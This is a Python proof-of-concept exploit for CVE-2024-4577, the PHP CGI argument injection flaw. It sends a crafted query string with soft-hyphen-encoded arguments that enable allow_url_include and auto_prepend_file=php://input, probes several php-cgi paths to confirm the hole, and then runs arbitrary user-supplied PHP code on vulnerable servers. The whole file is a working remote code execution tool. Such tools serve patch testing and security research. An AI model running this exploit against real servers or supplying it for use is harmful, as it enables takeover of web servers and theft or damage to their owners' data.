"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
POC by: username
"""

banner = """
█   █ █████ █████ ████  █   █  ███  █   █ █████ 
█   █ █     █     █   █ ██  █ █   █ ██ ██ █     
█   █ █████ ████  ████  █ █ █ █████ █ █ █ ████  
█   █     █ █     █   █ █  ██ █   █ █   █ █     
█████ █████ █████ █   █ █   █ █   █ █   █ █████ 

CVE-2024-4577
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
POC by: username
"""


import warnings
import requests
import json
import argparse

warnings.filterwarnings("ignore", category=DeprecationWarning)
requests.packages.urllib3.disable_warnings()

def send_request(target, path, code):
    try:
        url = f"{target}{path}?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
        headers = {"User-Agent": "curl/8.3.0", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive"}
        data = code
        return requests.post(url, headers=headers, data=data, verify=False)
    except Exception as e:
        print(f"{target} unreachable")
        return 0

def verify_vuln(target):
    paths = ["/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe", "/index.php", "/test.php", "/test.hello"]
    check = True
    listvuln = []
    code = "<?php\r\necho md5('username');\r\n?>\r\n\r\n"
    try:
        for path in paths:
            response = send_request(target, path, code)
            if '14c4b06b824ec593239362517f538b29' in response.text:
                print(f"{target} is vulnerable with path {path}")
                listvuln.append(path)
                check = False
        if check:
            print(f"{target} is not vulnerable")
            exit()
        else:
            return listvuln
    except Exception as e:
        print(f"{target} unreachable")

def main():
    parser = argparse.ArgumentParser(usage="""python CVE-2024-4577-POC --target http://127.0.0.1""")
    parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
    parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=False)
    args = parser.parse_args()
    args.target = args.target.rstrip('/')
    
    vulnpath = verify_vuln(args.target)
    
    if args.code is not None:
        for path in vulnpath:
            print()
            print(f"Sending code to path {path}")
            response = send_request(args.target, path, args.code)
            if response == 0:
                pass
            print("Output: ")
            print(response.text) 

if __name__ == "__main__":
    print(banner)
    print("Start pwned\n")
    main()
